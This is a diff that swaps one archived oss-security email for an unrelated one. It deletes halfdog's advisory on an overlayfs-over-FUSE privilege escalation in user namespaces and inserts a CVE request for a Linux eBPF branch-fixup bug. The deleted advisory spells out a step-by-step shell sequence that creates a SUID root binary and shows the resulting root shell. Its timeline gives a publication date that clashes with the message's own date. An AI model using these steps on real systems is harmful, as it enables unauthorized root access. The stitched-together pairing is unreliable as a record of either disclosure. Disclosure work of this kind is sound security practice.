@@ -1,126 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/24/8
-Message-ID: <f16c78c5-5666-5322-2807-b68a8e13356e@halfdog.net>
-Date: Wed, 24 Feb 2016 06:03:35 +0000
-From: halfdog <me@...fdog.net>
-To: oss-security@...ts.openwall.com
-Subject: Overlayfs over Fuse Privilege Escalation in USERNS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/14/1
+Message-ID: <20160214145217.GA20931@eldamar.local>
+Date: Sun, 14 Feb 2016 15:52:17 +0100
+From: Salvatore Bonaccorso <carnil@...ian.org>
+To: OSS Security Mailinglist <oss-security@...ts.openwall.com>
+Cc: Ben Hutchings <benh@...ian.org>
+Subject: CVE Request: Linux: Incorrect branch fixups for eBPF allow arbitrary read
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hi
 
-[http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/]
+We would like to request a CVE for the following issue fixed in Linux
+with the following commit, which as well contains an analysis:
 
-Introduction:
-=============
+https://git.kernel.org/linus/a1b14d27ed0965838350f1377ff97c93ee383492
+(will be in v4.5-rc4):
 
-* Problem description:
+> When ctx access is used, the kernel often needs to expand/rewrite
+> instructions, so after that patching, branch offsets have to be
+> adjusted for both forward and backward jumps in the new eBPF program,
+> but for backward jumps it fails to account the delta. Meaning, for
+> example, if the expansion happens exactly on the insn that sits at
+> the jump target, it doesn't fix up the back jump offset.
 
-On Ubuntu Wily it is possible to place an USERNS overlayfs mount over
-a fuse mount. The fuse filesystem may contain SUID binaries, but those
-cannot be used to gain privileges due to nosuid mount options. But
-when touching such an SUID binary via overlayfs mount, this will
-trigger copy_up including all file attributes, thus creating a real
-SUID binary on the disk.
-Methods
+The issue was introduced in v4.1-rc1 with commit
+https://git.kernel.org/linus/9bac3d6d548e5cc925570b263f35b70a00a00ffd
+.
 
-Basic exploitation sequence is:
+Could you please assign a CVE for this issue?
 
-    Mount fuse filesystem exposing one world writable SUID binary
-    Create USERNS
-    Mount overlayfs on top of fuse
-    Open the SUID binary RDWR in overlayfs, thus triggering copy_up
-
-This can be archived, e.g.
-
-test# mkdir fuse
-test# mv SuidExec RealFile
-test# ./FuseMinimal fuse
-test# ./UserNamespaceExec -- /bin/bash
-root# mkdir mnt upper work
-root# mount -t overlayfs -o lowerdir=fuse,upperdir=upper,workdir=work
-overlayfs mnt
-root# touch mnt/file
-touch: setting times of ‘mnt/file’: Permission denied
-root# umount mnt
-root# exit
-test# fusermount -u fuse
-test# ls -al upper/file
-- -rwsr-xr-x 1 root root 9088 Jan 22 09:18 upper/file
-test# upper/file /bin/bash
-root# id
-uid=0(root) gid=100(users) groups=100(users)
-
-
-Results, Discussion:
-====================
-
-* Fixing the issue itself:
-
-In my opinion, fuse filesystem allowed pretending to have files with
-different UIDs/GIDs in the local mount namespace, but they never had
-those properties, those files would have, when really stored on local
-disk. So e.g., the SUID binaries lost their SUID-properties and the
-owner could also modify arbitrary file content, even if file
-attributes were pretending, that he does not have access - by having
-control over the fuse process simulating the filesystem, such access
-control is futile. That is also the reason, why no other user than the
-one mounting the filesystem may have rights to access it by default.
-
-Hence the workarounds should be to restrict access to fuse also only
-to the mount namespace where it was created.
-
-* Avoiding numerous namespace issues in future:
-
-In my opinion, enabing USERNS was a little too fast, as it exposes a
-lot of additional kernel code to users without any special
-capabilities in init-ns by using the elevated privileges within the
-container. This is also recognized by others, but there is dispute on
-the consequences to draw from that. See Patch to disable unprivileged
-userns ... on LKML [0].
-
-I completely second the request to have options to disable the USERNS
-layer as it depends on the system type, if USERNS is a net gain
-regarding security or a net loss. It should be a gain on systems,
-where it allows to perform critical operations within a containment, a
-use-case where chroots are used currently. Without USERNS, those
-operations are likely to be performed with SUID helpers in the init-ns
-or privilege separation might be dropped completely as the overhead is
-too large for efficient work procedures.
-
-On the other hand, systems where all processes have similar security
-level, e.g. as they all process the same data, further privilege
-separation is not easy. The USERNS support will add only new risks here.
-
-Timeline:
-=========
-
-* 20160117: Discovery, report at Launchpad [1]
-* 20160121: First feedback from Ubuntu, Seth Arnold alreay working on
-submitted but not yet accepted upstream patch
-* 20160121: Feedback: first patch does not seem sufficient
-* 20160122: Patch request to disable unprivileged userns due to this
-and other issues LKML [0]
-* 20160131: Bugfix by Seth Forshee available on Ubuntu Launchpad
-* 20160117: CVE-2016-1576 linked on Launchpad [2]
-* 20161122: CRD and publication
-
-
-References:
-===========
-
-[0] https://lkml.org/lkml/2016/1/22/7
-[1] https://bugs.launchpad.net/bugs/1535150
-[2] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1576
-
-- -- 
-http://www.halfdog.net/
-PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iEYEARECAAYFAlbNR6wACgkQxFmThv7tq+70lwCfQh6+nQjTnK7NGDkSXSBJEP8o
-BnoAni1JcpmoV4s+NzqryJxKwZVTV3dO
-=FO71
------END PGP SIGNATURE-----
+Regards,
+Salvatore
